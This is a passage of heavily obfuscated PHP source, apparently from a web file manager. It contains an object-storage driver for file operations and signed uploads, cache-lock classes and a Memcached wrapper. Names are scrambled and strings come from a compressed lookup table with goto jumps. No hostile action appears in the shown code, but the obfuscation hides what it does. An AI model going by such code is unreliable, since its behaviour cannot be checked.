$this->_isFolder($†Ú¿œû¿)) { return $this->getPathOuter($†Ú¿œû¿); } $ğøÊ‹‰É = $this->setContent($†Ú¿œû¿, $ş’Ö×é¥[12], !0); if ($ğøÊ‹‰É !== !1) { return $this->getPathOuter($†Ú¿œû¿); } return !1; } public function copyFile($ÓÂ¼ê“, $¢ÈÀÁ÷, $Æ™ØÏ°Á = array()) { $ş±µ¤ü— =& $_SERVER[¤·²È‰º]; $Ä€Ã‘± = $this->objectMeta($ÓÂ¼ê“); if (!$Ä€Ã‘±) { return !1; } if ($Ä€Ã‘±[$ş±µ¤ü—[86]] <= 1024 * 1024 * 200) { $ì»ŸÒâš = $this->client->copyObject($this->bucket, $ÓÂ¼ê“, $this->bucket, $¢ÈÀÁ÷, $ş±µ¤ü—[208], $Æ™ØÏ°Á); } else { $ì»ŸÒâš = $this->client->multiCopyObject($this->bucket, $ÓÂ¼ê“, $this->bucket, $¢ÈÀÁ÷, $Æ™ØÏ°Á); } $ì»ŸÒâš = $ì»ŸÒâš ? $this->getPathOuter($¢ÈÀÁ÷) : !1; return $ì»ŸÒâš; } public function moveFile($µÅ¾·ğÀ, $óıÇß) { if ($this->copyFile($µÅ¾·ğÀ, $óıÇß)) { $this->delFile($µÅ¾·ğÀ); return $this->getPathOuter($óıÇß); } return !1; } public function delFile($™š¤ ‘) { return $this->client->deleteObject($this->bucket, $™š¤ ‘); } public function delFolder($Ÿ¦ªÔ”) { $ø è¾‘ =& $_SERVER[¤·²È‰º]; if (!$this->exist($Ÿ¦ªÔ”)) { return !0; } $this->listItemCache = !1; $åä¿Ó’ = $this->fileList($Ÿ¦ªÔ”); $this->listItemCache = !0; $Ò¹¦ª— = trim($Ÿ¦ªÔ”, $ø è¾‘[8]) . $ø è¾‘[8]; if (!empty($Ÿ¦ªÔ”) && $Ÿ¦ªÔ” !== $ø è¾‘[207] && !in_array($Ò¹¦ª—, $åä¿Ó’[$ø è¾‘[92]])) { $åä¿Ó’[$ø è¾‘[92]][] = $Ò¹¦ª—; } $¸Åª²Ïƒ = $this->delByBatch($åä¿Ó’[$ø è¾‘[93]]); if (!$¸Åª²Ïƒ) { return !1; } $¸Åª²Ïƒ = $this->delByBatch($åä¿Ó’[$ø è¾‘[92]]); if (!$¸Åª²Ïƒ) { return !1; } return $this->delFile($Ò¹¦ª—); } private function delByBatch($¬ÆåŸ¤Ç) { foreach (array_chunk($¬ÆåŸ¤Ç, 1000) as $¯€À÷¾Õ) { $ÖáìÄ¾ = $this->client->deleteObjects($this->bucket, $¯€À÷¾Õ); if (!$ÖáìÄ¾) { return !1; } } return !0; } public function rename($Ó×Æ‚‘À, $Ø•¦õ) { return $this->renameObject($Ó×Æ‚‘À, $Ø•¦õ); } public function listPath($İÒÎîƒ, $ãğıàÉ = false) { $‚ığ†ˆ¶ =& $_SERVER[¤·²È‰º]; $¢µ¼íÁ˜ = $this->fileList($İÒÎîƒ, $‚ığ†ˆ¶[8], !0); foreach ($¢µ¼íÁ˜[$‚ığ†ˆ¶[92]] as $ˆ ø½šÎ => $Îş®ä£) { $¢µ¼íÁ˜[$‚ığ†ˆ¶[92]][$ˆ ø½šÎ] = $this->folderInfo($Îş®ä£, $ãğıàÉ, $Îş®ä£); } foreach ($¢µ¼íÁ˜[$‚ığ†ˆ¶[93]] as $ˆ ø½šÎ => $Îş®ä£) { $¢µ¼íÁ˜[$‚ığ†ˆ¶[93]][$ˆ ø½šÎ] = $this->fileInfo($Îş®ä£[$‚ığ†ˆ¶[42]], $ãğıàÉ, $Îş®ä£); } return $¢µ¼íÁ˜; } protected function infoChildren($…°Ä“À­, &$ºåÌÙ‘) { $âÈèƒµî =& $_SERVER[¤·²È‰º]; $Ûñ¥ó™Ä = $this->fileList($…°Ä“À­, $âÈèƒµî[12], !0); $ºåÌÙ‘[$âÈèƒµî[88]] += count($Ûñ¥ó™Ä[$âÈèƒµî[92]]); $ºåÌÙ‘[$âÈèƒµî[87]] += count($Ûñ¥ó™Ä[$âÈèƒµî[93]]); foreach ($Ûñ¥ó™Ä[$âÈèƒµî[93]] as $Íì’¥) { if (!$Íì’¥ || !$Íì’¥[$âÈèƒµî[86]]) { continue; } $ºåÌÙ‘[$âÈèƒµî[86]] += $Íì’¥[$âÈèƒµî[86]]; } } private function fileInfo($”ŞşÚÔ, $¥¼—Ü‡÷ = false, $èœÒö¢Û = array()) { $œª»æŸ› =& $_SERVER[¤·²È‰º]; $Â¿¯¹•í = array($œª»æŸ›[42] => $this->pathThis($”ŞşÚÔ), $œª»æŸ›[94] => $this->getPathOuter($”ŞşÚÔ), $œª»æŸ›[43] => $œª»æŸ›[209], $œª»æŸ›[184] => $this->ext($”ŞşÚÔ), $œª»æŸ›[86] => isset($èœÒö¢Û[$œª»æŸ›[86]]) ? $èœÒö¢Û[$œª»æŸ›[86]] : 0); if ($¥¼—Ü‡÷) { return $Â¿¯¹•í; } $Â¿¯¹•í[$œª»æŸ›[210]] = $Â¿¯¹•í[$œª»æŸ›[95]] = 0; $Â¿¯¹•í[$œª»æŸ›[211]] = $Â¿¯¹•í[$œª»æŸ›[212]] = !0; if (empty($èœÒö¢Û)) { $èœÒö¢Û = $this->objectMeta($”ŞşÚÔ); if (!$èœÒö¢Û) { return $Â¿¯¹•í; } } if (isset($èœÒö¢Û[$œª»æŸ›[213]])) { $Â¿¯¹•í[$œª»æŸ›[95]] = $èœÒö¢Û[$œª»æŸ›[213]]; } if (isset($èœÒö¢Û[$œª»æŸ›[86]])) { $Â¿¯¹•í[$œª»æŸ›[86]] = $èœÒö¢Û[$œª»æŸ›[86]]; } return $Â¿¯¹•í; } private function folderInfo($õã‡Æ€æ, $¯‰ˆÎÇå = false, $èæ¥³ıì = array()) { $­„ùšµ =& $_SERVER[¤·²È‰º]; $àãüàÆÓ = array($­„ùšµ[42] => $this->pathThis($õã‡Æ€æ), $­„ùšµ[94] => $this->getPathOuter($­„ùšµ[8] . $õã‡Æ€æ), $­„ùšµ[43] => $­„ùšµ[85]); if ($¯‰ˆÎÇå) { return $àãüàÆÓ; } $àãüàÆÓ[$­„ùšµ[210]] = $àãüàÆÓ[$­„ùšµ[95]] = 0; $àãüàÆÓ[$­„ùšµ[211]] = $àãüàÆÓ[$­„ùšµ[212]] = !0; if ($õã‡Æ€æ == $­„ùšµ[12]) { return $àãüàÆÓ; } if (empty($èæ¥³ıì)) { $èæ¥³ıì = $this->objectMeta(trim($õã‡Æ€æ, $­„ùšµ[8]) . $­„ùšµ[8]); } if (isset($èæ¥³ıì[$­„ùšµ[213]])) { $àãüàÆÓ[$­„ùšµ[210]] = $èæ¥³ıì[$­„ùšµ[213]]; } return $àãüàÆÓ; } private function fileList($Ïƒ³¦Ğ±, $Óæ²ìŠ¯ = '', $ë±¥Üä… = 0) { $ğæ¿Îù¬ =& $_SERVER[¤·²È‰º]; $†‰Ûé¿® = rtrim($Ïƒ³¦Ğ±, $ğæ¿Îù¬[8]) . $ğæ¿Îù¬[8]; $€ÖÚ×‘ = $this->listObjs($†‰Ûé¿®, null, null, $Óæ²ìŠ¯); if (!$€ÖÚ×‘) { return array($ğæ¿Îù¬[92] => array(), $ğæ¿Îù¬[93] => array()); } $Ã²ìÍ²Ÿ = $‡¨â¶Â• = array(); foreach ($€ÖÚ×‘[$ğæ¿Îù¬[214]] as $æşè«çø) { $Ø¢Üë‚½ = $æşè«çø[$ğæ¿Îù¬[42]]; if ($Ø¢Üë‚½ == $†‰Ûé¿®) { continue; } $‘–ã¿âÜ = isset($æşè«çø[$ğæ¿Îù¬[86]]) ? $æşè«çø[$ğæ¿Îù¬[86]] : 0; $ÇªÍûÃ = $‘–ã¿âÜ == 0 && substr($Ø¢Üë‚½, strlen($Ø¢Üë‚½) - 1, 1) == $ğæ¿Îù¬[8] ? !0 : !1; $this->cacheMethodInfoSet($Ø¢Üë‚½, $ÇªÍûÃ, $æşè«çø); if ($ÇªÍûÃ) { $Ã²ìÍ²Ÿ[] = $Ø¢Üë‚½; continue; } $‡¨â¶Â•[] = $ë±¥Üä… ? $æşè«çø : $Ø¢Üë‚½; } foreach ($€ÖÚ×‘[$ğæ¿Îù¬[215]] as $æşè«çø) { $Ã²ìÍ²Ÿ[] = $æşè«çø[$ğæ¿Îù¬[42]]; $this->cacheMethodInfoSet($æşè«çø[$ğæ¿Îù¬[42]], !0); } $this->cacheMethodInfoSet($Ïƒ³¦Ğ±, !0); return array($ğæ¿Îù¬[92] => $Ã²ìÍ²Ÿ, $ğæ¿Îù¬[93] => $‡¨â¶Â•); } private function listObjs($­÷Ù¶Û¬, $µÍËøî = null, $ûÊ£¾’ = null, $Ğ¿ÛÕ“ë = null) { $ŠûÏ× =& $_SERVER[¤·²È‰º]; $­÷Ù¶Û¬ = trim($­÷Ù¶Û¬, $ŠûÏ×[8]); $è¤‚›ˆ† = empty($­÷Ù¶Û¬) && $­÷Ù¶Û¬ !== $ŠûÏ×[207] ? $ŠûÏ×[12] : $­÷Ù¶Û¬ . $ŠûÏ×[8]; return $this->client->getBucket($this->bucket, $è¤‚›ˆ†, $µÍËøî, $ûÊ£¾’, $Ğ¿ÛÕ“ë, !0); } public function has($òöÌ§¯…, $‘¹À¥† = false, $µ÷ËÀÃÅ = true) { $ÇÔ¦ıîº =& $_SERVER[¤·²È‰º]; $òöÌ§¯… = trim($òöÌ§¯…, $ÇÔ¦ıîº[8]); $£¯ÇµèÈ = empty($òöÌ§¯…) && $òöÌ§¯… !== $ÇÔ¦ıîº[207] ? $ÇÔ¦ıîº[12] : $òöÌ§¯… . $ÇÔ¦ıîº[8]; $´°­âùÓ = null; $æÉÇ¡ÀÌ = 500; $ãµ¯Û¯ = $ÇÔ¦ıîº[8]; $·’şÛ½¥ = $åäªº·Ò = array(); while (!0) { $®¿˜â£– = $this->listObjs($òöÌ§¯…, $´°­âùÓ, $æÉÇ¡ÀÌ, $ãµ¯Û¯); if (!$®¿˜â£–) { break; } $´°­âùÓ = $®¿˜â£–[$ÇÔ¦ıîº[216]]; $Ñ×ä§¢° = $®¿˜â£–[$ÇÔ¦ıîº[214]]; $Åê«˜ïÊ = $®¿˜â£–[$ÇÔ¦ıîº[215]]; if (empty($Ñ×ä§¢°) && empty($Åê«˜ïÊ)) { break; } if (count($Ñ×ä§¢°) == 1 && $Ñ×ä§¢°[0][$ÇÔ¦ıîº[42]] == $£¯ÇµèÈ) { break; } if ($‘¹À¥†) { if (count($Ñ×ä§¢°)) { $Ñ×ä§¢° = array_column($Ñ×ä§¢°, $ÇÔ¦ıîº[42]); $·’şÛ½¥ = array_merge($·’şÛ½¥, $Ñ×ä§¢°); } if (count($Åê«˜ïÊ)) { $Åê«˜ïÊ = array_column($Åê«˜ïÊ, $ÇÔ¦ıîº[42]); $åäªº·Ò = array_merge($åäªº·Ò, $Åê«˜ïÊ); } if ($´°­âùÓ === null) { break; } continue; } if ($µ÷ËÀÃÅ) { if (!empty($Ñ×ä§¢°)) { if (count($Ñ×ä§¢°) > 1 || isset($Ñ×ä§¢°[0][$ÇÔ¦ıîº[42]]) && $Ñ×ä§¢°[0][$ÇÔ¦ıîº[42]] != $£¯ÇµèÈ) { return !0; } } } else { if (!empty($Åê«˜ïÊ)) { return !0; } } if ($´°­âùÓ === null) { break; } } if ($‘¹À¥†) { $·’şÛ½¥ = array_diff($·’şÛ½¥, array($£¯ÇµèÈ)); $·’şÛ½¥ = count(array_unique($·’şÛ½¥)); $åäªº·Ò = count(array_unique($åäªº·Ò)); return array($ÇÔ¦ıîº[217] => $·’şÛ½¥, $ÇÔ¦ıîº[218] => $åäªº·Ò); } return !1; } public function listAll($öè‰Äò¶) { $—ÅÔ¿® =& $_SERVER[¤·²È‰º]; $İâãşö = $this->fileList($öè‰Äò¶, $—ÅÔ¿®[12], !0); $üŒÄ©ö = array(); foreach ($İâãşö[$—ÅÔ¿®[93]] as $´Ïíá²´) { $üŒÄ©ö[$´Ïíá²´[$—ÅÔ¿®[42]]] = $´Ïíá²´[$—ÅÔ¿®[86]]; } foreach ($İâãşö[$—ÅÔ¿®[92]] as $´Ïíá²´) { if (is_string($´Ïíá²´)) { $üŒÄ©ö[$´Ïíá²´] = 0; } } return $this->listAllFiles($öè‰Äò¶, array_keys($üŒÄ©ö), $üŒÄ©ö); } public function canRead($Ã–•»·ç) { $¢ø¤¢şá =& $_SERVER[¤·²È‰º]; $Ñìá‡³ó = $this->client->getAccessControlPolicy($this->bucket, $Ã–•»·ç); if (!$Ñìá‡³ó) { return !1; } return in_array($Ñìá‡³ó, array($¢ø¤¢şá[219], $¢ø¤¢şá[220], $¢ø¤¢şá[221])) ? !0 : !1; } public function canWrite($¸˜æúå) { $ı“Ãå¶ =& $_SERVER[¤·²È‰º]; $ÏĞ¦ÍÛÊ = $this->client->getAccessControlPolicy($this->bucket, $¸˜æúå); if (!$ÏĞ¦ÍÛÊ) { return !1; } return in_array($ÏĞ¦ÍÛÊ, array($ı“Ãå¶[219], $ı“Ãå¶[220])) ? !0 : !1; } public function getContent($Ğ©·¢ØÑ) { return $this->client->getObject($this->bucket, $Ğ©·¢ØÑ); } public function setContent($µö¨íâ­, $¸…¢ºùÄ = '', $±›à”…¸ = false) { $¥şœäé =& $_SERVER[¤·²È‰º]; $µö¨íâ­ = $±›à”…¸ ? trim($µö¨íâ­, $¥şœäé[8]) . $¥şœäé[8] : $µö¨íâ­; $äÙğƒ‘µ = get_file_mime(get_path_ext($µö¨íâ­)); $¯¡¼ûû¹ = $this->client->putObject($¸…¢ºùÄ, $this->bucket, $µö¨íâ­, $¥şœäé[208], array(), $äÙğƒ‘µ); if (!$¯¡¼ûû¹) { return !1; } if ($±›à”…¸) { return !0; } $this->cacheMethod(null, null); $¯¡¼ûû¹ = $this->copyFile($µö¨íâ­, $µö¨íâ­, array($¥şœäé[222] => $¯¡¼ûû¹[$¥şœäé[223]])); return $¯¡¼ûû¹ ? !0 : !1; } public function fileSubstr($ßãš—š, $¾‹ÏëŞ, $†„€¸é¶) { $ŠÉÉë« = $¾‹ÏëŞ + $†„€¸é¶ - 1; return $this->client->getObject($this->bucket, $ßãš—š, array($_SERVER[¤·²È‰º][224] => "\x62\171\164\145\x73\75{$¾‹ÏëŞ}\x2d{$ŠÉÉë«}")); } public function upload($ÂÃªÀ„•, $àßœ…€õ, $ÔâüÖóû = false, $®ùÈÛØ = REPEAT_REPLACE) { $ßÎ»§‡à =& $_SERVER[¤·²È‰º]; $‰ÃàçÎ¯ = array($ßÎ»§‡à[222] => @md5_file($àßœ…€õ)); $ßô¼ Áˆ = array($ßÎ»§‡à[225] => get_file_mime(get_path_ext($ÂÃªÀ„•))); if (IO::size($àßœ…€õ) <= 1024 * 1024 * 200) { $³Œ÷¦Ş = $this->client->putObjectFile($àßœ…€õ, $this->bucket, $ÂÃªÀ„•, $ßÎ»§‡à[208], $‰ÃàçÎ¯, $ßô¼ Áˆ); return !empty($³Œ÷¦Ş) ? $this->getPathOuter($ÂÃªÀ„•) : !1; } $üãÚô‚½ = $this->client->multiUploadObject($àßœ…€õ, $this->bucket, trim($ÂÃªÀ„•, $ßÎ»§‡à[8]), $‰ÃàçÎ¯, $ßô¼ Áˆ); return $üãÚô‚½ ? $this->getPathOuter($ÂÃªÀ„•) : !1; } public function download($¸ÅÏİ•¯, $áƒâÃô) { if (!@is_dir($this->pathFather($áƒâÃô)) && !IO::mkdir($this->pathFather($áƒâÃô))) { return !1; } $Ï¹ïÎÙÜ = $this->client->getObject($this->bucket, $¸ÅÏİ•¯, array(), $áƒâÃô); return $Ï¹ïÎÙÜ !== !1 ? $áƒâÃô : !1; } public function link($ò§šŒõù, $ÃíºˆĞ = array()) { $Èîñõš’ =& $_SERVER[¤·²È‰º]; if ($this->signVer == $Èîñõš’[226]) { return $this->client->getAuthenticatedURL($this->bucket, $ò§šŒõù, 3600 * 12, $ÃíºˆĞ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ò§šŒõù, $Èîñõš’[8]), 3600 * 12, $this->region, array(), !0, $ÃíºˆĞ); } public function fileOut($¶ê¦áÍú, $ä˜›¸Ş© = false, $§ë˜§´ü = false, $“Ã—×€ì = '') { $Œ¨‡¨ªà =& $_SERVER[¤·²È‰º]; if ($this->isFileOutServer()) { return $this->fileOutServer($¶ê¦áÍú, $ä˜›¸Ş©, $§ë˜§´ü, $“Ã—×€ì); } if (!$§ë˜§´ü) { $§ë˜§´ü = $this->pathThis($¶ê¦áÍú); } $ù‡ŞÃÜ› = get_file_mime(get_path_ext($§ë˜§´ü)); if ($ù‡ŞÃÜ› == $Œ¨‡¨ªà[227]) { return parent::fileOut($¶ê¦áÍú, $ä˜›¸Ş©, $§ë˜§´ü, $“Ã—×€ì); } $ö¦ÎöŒ = array($Œ¨‡¨ªà[228] => $ù‡ŞÃÜ›); if ($ä˜›¸Ş©) { $ö¦ÎöŒ[$Œ¨‡¨ªà[229]] = $Œ¨‡¨ªà[230] . rawurlencode($§ë˜§´ü); } else { } $‡Ô‘ş¤Ğ = $this->link($¶ê¦áÍú, $ö¦ÎöŒ); $this->fileOutLink($‡Ô‘ş¤Ğ); } public function fileOutServer($ˆÙËóÕ, $ö‹“Ÿ“¨ = false, $˜±–üµğ = false, $ÑÏ’Ì‰É = '') { parent::fileOut($ˆÙËóÕ, $ö‹“Ÿ“¨, $˜±–üµğ, $ÑÏ’Ì‰É); } public function fileOutImageServer($‘Šœ¥£, $ÜàØ´Äà = 250) { parent::fileOutImage($‘Šœ¥£, $ÜàØ´Äà); } public function hashMd5($¦€¨´¨Œ, $ÏšôÔ›­ = '') { $çéåàª¶ =& $_SERVER[¤·²È‰º]; $Šç²¥™… = $this->objectMeta($¦€¨´¨Œ); if (!$Šç²¥™…) { return !1; } $ÏšôÔ›­ = $ÏšôÔ›­ ? $ÏšôÔ›­ : _get($Šç²¥™…, $çéåàª¶[231]); $ÏšôÔ›­ = $ÏšôÔ›­ ? $ÏšôÔ›­ : _get($Šç²¥™…, $çéåàª¶[223], $çéåàª¶[12]); return $ÏšôÔ›­; } public function uploadFormData($æ¢Ì³‹½, $ÒŒò¾¸ó = 3600) { $’¿¾ä‡… =& $_SERVER[¤·²È‰º]; $—íï©Û§ = $this->pathFather($æ¢Ì³‹½); $ñéêÎƒ = $this->client->getHttpUploadPostParams($this->bucket, $—íï©Û§, $’¿¾ä‡…[208], $ÒŒò¾¸ó); return array_merge((array) $ñéêÎƒ, array($’¿¾ä‡…[191] => $this->getHost())); } public function multiUploadFormData($×±ÏØã, $Ş¾Â´« = 3600) { $¾ü³«²¾ =& $_SERVER[¤·²È‰º]; $ú˜Œ”ûâ = gmdate($¾ü³«²¾[232]); $Áé— “ß = array(); $„Ò×™×· = $this->client->getUploadId($this->bucket, $×±ÏØã, $Áé— “ß); if (!$„Ò×™×·) { return !1; } return array($¾ü³«²¾[233] => $„Ò×™×·, $¾ü³«²¾[191] => $this->getHost() . $¾ü³«²¾[8] . $this->pathEncode($×±ÏØã), $¾ü³«²¾[234] => $ú˜Œ”ûâ, $¾ü³«²¾[104] => $×±ÏØã); } public function multiUploadAuthData($õâĞ’…Í, $¨È¤”»ù = array()) { $¯Ûöùô¬ =& $_SERVER[¤·²È‰º]; $È°‚Ó ê = isset($¨È¤”»ù[$¯Ûöùô¬[234]]) ? $¨È¤”»ù[$¯Ûöùô¬[234]] : gmdate($¯Ûöùô¬[232]); $Â´¹ğ£‰ = isset($¨È¤”»ù[$¯Ûöùô¬[184]]) ? $¨È¤”»ù[$¯Ûöùô¬[184]] : $¯Ûöùô¬[12]; $Å˜ÎõÅ = $¨È¤”»ù[$¯Ûöùô¬[104]]; unset($¨È¤”»ù[$¯Ûöùô¬[104]]); if (isset($¨È¤”»ù[$¯Ûöùô¬[235]])) { $¨È¤”»ù[$¯Ûöùô¬[234]] = $È°‚Ó ê; return $this->listUploadParts($Å˜ÎõÅ, $¨È¤”»ù); } $“ÑÈÅ¹² = array($¯Ûöùô¬[236], $¯Ûöùô¬[12], $¯Ûöùô¬[130], $¯Ûöùô¬[12], "\x78\55\141\x6d\x7a\55\x64\x61\x74\x65\x3a{$È°‚Ó ê}", $¯Ûöùô¬[8] . $this->bucket . $¯Ûöùô¬[8] . $this->pathEncode($Å˜ÎõÅ) . $Â´¹ğ£‰); if (strpos($Â´¹ğ£‰, $¯Ûöùô¬[237]) === 0) { $“ÑÈÅ¹²[0] = $¯Ûöùô¬[238]; } if (isset($¨È¤”»ù[$¯Ûöùô¬[239]]) && $¨È¤”»ù[$¯Ûöùô¬[239]] == $¯Ûöùô¬[240]) { $“ÑÈÅ¹²[0] = $¯Ûöùô¬[240]; } $Æõ¾·©á = implode($¯Ûöùô¬[18], $“ÑÈÅ¹²); $™ÍÛ¼Ÿ¿ = base64_encode(hash_hmac($¯Ûöùô¬[241], $Æõ¾·©á, $this->secret, !0)); $äœº€¨ˆ = $¯Ûöùô¬[242] . $this->accessKey . $¯Ûöùô¬[4] . $™ÍÛ¼Ÿ¿; if (strpos($Â´¹ğ£‰, $¯Ûöùô¬[237]) === 0) { return array($¯Ûöùô¬[243] => $äœº€¨ˆ, $¯Ûöùô¬[234] => $È°‚Ó ê); } return $äœº€¨ˆ; } public function listUploadParts($ªÂı¹¿, $¼¶Ş¡øÜ = array()) { $´Êó²ÍÚ =& $_SERVER[¤·²È‰º]; $áïÓÏ‰± = str_replace($´Êó²ÍÚ[244], $´Êó²ÍÚ[12], $¼¶Ş¡øÜ[$´Êó²ÍÚ[184]]); $“¦Ğ¥¤ = $this->client->listParts($this->bucket, $ªÂı¹¿, $áïÓÏ‰±); if (!$“¦Ğ¥¤) { return !1; } unset($¼¶Ş¡øÜ[$´Êó²ÍÚ[235]], $¼¶Ş¡øÜ[$´Êó²ÍÚ[239]]); $¼¶Ş¡øÜ[$´Êó²ÍÚ[104]] = $ªÂı¹¿; $Éßß§ÙŠ = $this->multiUploadAuthData($ªÂı¹¿, $¼¶Ş¡øÜ); if (empty($Éßß§ÙŠ)) { return !1; } return array($´Êó²ÍÚ[243] => $Éßß§ÙŠ, $´Êó²ÍÚ[234] => $¼¶Ş¡øÜ[$´Êó²ÍÚ[234]], $´Êó²ÍÚ[245] => $“¦Ğ¥¤); } public function getHost() { return parent::getHost() . $_SERVER[¤·²È‰º][8] . $this->bucket; } public function size($øûÒÎî…) { $ó¯û´óŸ = $this->objectMeta($øûÒÎî…); return $ó¯û´óŸ ? $ó¯û´óŸ[$_SERVER[¤·²È‰º][86]] : 0; } public function info($«¶ÎÓ™) { if ($this->isFolder($«¶ÎÓ™)) { return $this->folderInfo($«¶ÎÓ™); } else { if ($this->isFile($«¶ÎÓ™)) { return $this->fileInfo($«¶ÎÓ™); } } return !1; } public function exist($İŒ¡­Ùƒ) { return $this->isFile($İŒ¡­Ùƒ) || $this->isFolder($İŒ¡­Ùƒ); } public function isFile($û‘­ëÚ) { return !$this->isFolder($û‘­ëÚ) && $this->objectMeta($û‘­ëÚ); } public function isFolder($Ù–î“èÙ) { return $this->cacheMethod($_SERVER[¤·²È‰º][175], $Ù–î“èÙ); } protected function objectMeta($¨İ¹Ãô) { return $this->cacheMethod($_SERVER[¤·²È‰º][177], $¨İ¹Ãô); } protected function _objectMeta($‘“ä§»Š) { $­´óµ…Ç =& $_SERVER[¤·²È‰º]; $‘“ä§»Š = rtrim($‘“ä§»Š, $­´óµ…Ç[8]); try { $À‘ÜĞö = $this->client->getObjectInfo($this->bucket, $‘“ä§»Š); if (!isset($À‘ÜĞö[$­´óµ…Ç[231]]) && isset($À‘ÜĞö[$­´óµ…Ç[246]])) { $À‘ÜĞö[$­´óµ…Ç[231]] = $À‘ÜĞö[$­´óµ…Ç[246]]; } } catch (Exception $òõİ¼•ê) { $À‘ÜĞö = !1; } if (!$À‘ÜĞö) { } return $À‘ÜĞö; } protected function _isFolder($Â¯ÛßÄ) { $›˜ÏÅ =& $_SERVER[¤·²È‰º]; $Â¯ÛßÄ = rtrim($Â¯ÛßÄ, $›˜ÏÅ[8]); if ($Â¯ÛßÄ == $›˜ÏÅ[12] || $Â¯ÛßÄ == $›˜ÏÅ[8]) { return !0; } $¢ı¿Õûû = $this->client->getBucket($this->bucket, $Â¯ÛßÄ, null, 1); if (empty($¢ı¿Õûû[$›˜ÏÅ[214]])) { return !1; } $Ö–°”üª = $¢ı¿Õûû[$›˜ÏÅ[214]][0][$›˜ÏÅ[42]]; return stripos($Ö–°”üª, $Â¯ÛßÄ . $›˜ÏÅ[8]) === 0 ? !0 : !1; if (substr($Ö–°”üª, -1) == $›˜ÏÅ[8]) { return !0; } if (get_path_this($Ö–°”üª) == get_path_this($Â¯ÛßÄ)) { return !1; } return !0; } } goto c²¾ì Âë“; cµ‹ÈÎ«í˜: class CacheLockMemcached { public function lock($Ï¤òÁ–›, $ßö°úº¶ = 0) { $æÄš°’ä = Cache::init(); $Œ¨—ö«± = microtime(!0) + $ßö°úº¶; while (microtime(!0) < $Œ¨—ö«±) { $‚¥Œß½¶ = $æÄš°’ä->get($Ï¤òÁ–›); if (!$‚¥Œß½¶ || $‚¥Œß½¶ < microtime(!0)) { $ÇÆ˜ŒÒê = $æÄš°’ä->handle->add($Ï¤òÁ–›, $Œ¨—ö«±, $ßö°úº¶); if ($ÇÆ˜ŒÒê) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($˜¦‹Íò) { return Cache::init()->get($˜¦‹Íò); } public function unlock($˜ë€èÈ) { return Cache::init()->remove($˜ë€èÈ); } } class CacheLockDatabase { public function lock($•Ìªñ, $–Ô´§èá = 0) { $ÅØÉ¦ë° = Model($_SERVER[¤·²È‰º][830]); $úµ¾¨ß = microtime(!0) + $–Ô´§èá; while (microtime(!0) < $úµ¾¨ß) { $ˆëçİ™ = $ÅØÉ¦ë°->get($•Ìªñ); if (!$ˆëçİ™ || $ˆëçİ™ < microtime(!0)) { $˜Çí‹š¦ = $ÅØÉ¦ë°->set($•Ìªñ, $úµ¾¨ß); if ($˜Çí‹š¦) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ò”ù¿Â®) { return Model($_SERVER[¤·²È‰º][830])->get($Ò”ù¿Â®); } public function unlock($Òæ§“Ô÷) { Model($_SERVER[¤·²È‰º][830])->remove($Òæ§“Ô÷); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($°¬°áöœ, $÷ı¹©×¦) { $áûñ‹ä =& $_SERVER[¤·²È‰º]; if (!class_exists($áûñ‹ä[863])) { show_json($áûñ‹ä[864], !1); } $this->cacheTime = $÷ı¹©×¦; $this->handle = new Memcached(); if (is_array($°¬°áöœ[$áûñ‹ä[865]]) && count($°¬°áöœ[$áûñ‹ä[865]]) >= 1) { foreach ($°¬°áöœ[$áûñ‹ä[865]] as $É«Íô˜‹) { $µ·àÅÔ = explode($áûñ‹ä[4], $É«Íô˜‹); $this->handle->addServer($µ·àÅÔ[0], $µ·àÅÔ[1]); } } else { $this->handle->addServer($°¬°áöœ[$áûñ‹ä[191]], $°¬°áöœ[$áûñ‹ä[192]]); } } public function set($²Æ‡¢«†, $¨Ü§Ç’«, $˜Ö…ş¹ö = false) { $˜Ö…ş¹ö = $˜Ö…ş¹ö ? $˜Ö…ş¹ö : $this->cacheTime; return $this->handle->set($²Æ‡¢«†, $¨Ü§Ç’«, $˜Ö…ş¹ö); } public function get($­é«ê†Â) { return $this->handle->get($­é«ê†Â); } public function remove($ˆíäı) { return $this->handle->delete($ˆíäı); } public function deleteAll() { return $this->handle->flush(); } } goto EõÒĞçšƒ”; a†§Æ“³å†: define($_SERVER[¤·²È‰º][0], $_SERVER[¤·²È‰º][1]); $_SERVER[ŠË¥ÌáÛ] = explode($_SERVER[¤·²È‰º][2], gzinflate(substr($_SERVER[¤·²È‰º][3], 10, -8))); function binCheckEq($ÃĞÏ‹ôÍ, $ìªÛìşü) { return $ÃĞÏ‹ôÍ == $ìªÛìşü; } goto D¡ÜçÃÜ¾; d®š‚À†Í˜: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¥Ğ¬ÉİÍ) { $this->pathParse = $¥Ğ¬ÉİÍ; } protected function infoParse($¶íµŸœ­, $¤ŠÔÒŒ¦ = false) { $ó„â¯¿¿ =& $_SERVER[¤·²È‰º]; return Action($ó„â¯¿¿[1169])->sharePathInfo($this->pathParse[$ó„â¯¿¿[94]], !0, $¤ŠÔÒŒ¦); } public function listPath($’™çƒæ—, $‹ß˜¶˜ = false) { $§ø¯—³Û =& $_SERVER[¤·²È‰º]; $Ññü©•è = IO::listPath($’™çƒæ—, $‹ß˜¶˜); if (!$Ññü©•è) { return $Ññü©•è; } if (is_array($Ññü©•è[$§ø¯—³Û[1330]])) { $¦Ê‹ï² = Action($§ø¯—³Û[1339])->parsePathChildren($Ññü©•è[$§ø¯—³Û[1330]], array($§ø¯—³Û[429] => $’™çƒæ—)); $Ññü©•è[$§ø¯—³Û[1330]] = Action($§ø¯—³Û[1169])->shareItemInfo($¦Ê‹ï²); } foreach ($Ññü©•è as $Ï¦°“àú => $º ÓõÙ) { if (!in_array($Ï¦°“àú, array($§ø¯—³Û[93], $§ø¯—³Û[92]))) { continue; } foreach ($º ÓõÙ as $§ğõ¹¢İ => $¦Ê‹ï²) { $¦Ê‹ï² = Action($§ø¯—³Û[1339])->parsePathChildren($¦Ê‹ï², array($§ø¯—³Û[429] => $’™çƒæ—)); $Ññü©•è[$Ï¦°“àú][$§ğõ¹¢İ] = Action($§ø¯—³Û[1169])->shareItemInfo($¦Ê‹ï²); } } return $Ññü©•è; } public function listAll($ÇšªñËÓ) { $ßŞŞúİ =& $_SERVER[¤·²È‰º]; $úĞµê¬ = IO::listAll($ÇšªñËÓ); foreach ($úĞµê¬ as &$ÛŸ¥­ı) { $ÅíÆû‰Â = 